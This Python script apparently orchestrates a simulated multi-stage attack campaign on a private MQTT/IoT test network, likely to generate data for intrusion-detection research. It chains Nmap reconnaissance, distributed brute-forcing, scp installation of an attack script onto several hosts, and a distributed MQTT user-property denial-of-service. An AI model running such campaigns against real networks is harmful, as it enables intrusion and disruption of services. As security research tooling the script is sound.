from APT import *

step_seq = [(NetstatRecStep(5), 2), (Nmap192T5RecStep(10), 2), (PauseStep(80), 1),
            (Nmap10T5RecStep(10), 4), (PauseStep(70), 1),
            (BruteForceStep(10, is_distributed=True),),
            (NmapMQTTDiscStep("10.0.0.5"), 1), (NmapSubDiscStep("10.0.0.5", pause=10), 10),
            (NmapBannerDiscStep("10.0.0.5", pause=10), 5), (PauseStep(80), 1),
            (ScpInstStep("10.0.0.5", ["/user_property_attack.py", "/mqtt_utilities.py"]), 1),
            (UserPropExploit("10.0.0.5", "client3", "pass3", duration=1000, number=1000), 3),
            (PauseStep(100), 1), (Nmap10T5RecStep(3), 5), (BruteForceStep(2.5, action='t'), 2),
            (ScpInstStep("10.0.0.4", ["/user_property_attack.py", "/mqtt_utilities.py"], pause=12), 1),
            (ScpInstStep("10.0.0.6", ["/user_property_attack.py", "/mqtt_utilities.py"], pause=12), 1),
            (ScpInstStep("10.0.0.7", ["/user_property_attack.py", "/mqtt_utilities.py"], pause=12), 1),
            (ScpInstStep("10.0.0.8", ["/user_property_attack.py", "/mqtt_utilities.py"], pause=12), 1),
            (ScpInstStep("10.0.0.9", ["/user_property_attack.py", "/mqtt_utilities.py"], pause=12), 1),
            (ScpInstStep("10.0.0.15", ["/user_property_attack.py", "/mqtt_utilities.py"], pause=12), 1),
            (DistributedExploit(["10.0.0.4", "10.0.0.5", "10.0.0.7", "10.0.0.6", "10.0.0.8", "10.0.0.9"], 6,
                                UserPropExploit("", "client1", "pass1", duration=3600, number=3600, pause=10)),),
            (PauseStep(100), 2),
            (UserPropExploit("10.0.0.15", "client2", "pass2", number=100, duration=60), 60)
            ]
exp_details = []
atk = APTAttack(step_seq, "user_prop_ddos_scp_inst_camp_test", exp_details, "/output/experiment_details.pkl")
atk.run()
atk.save_in()
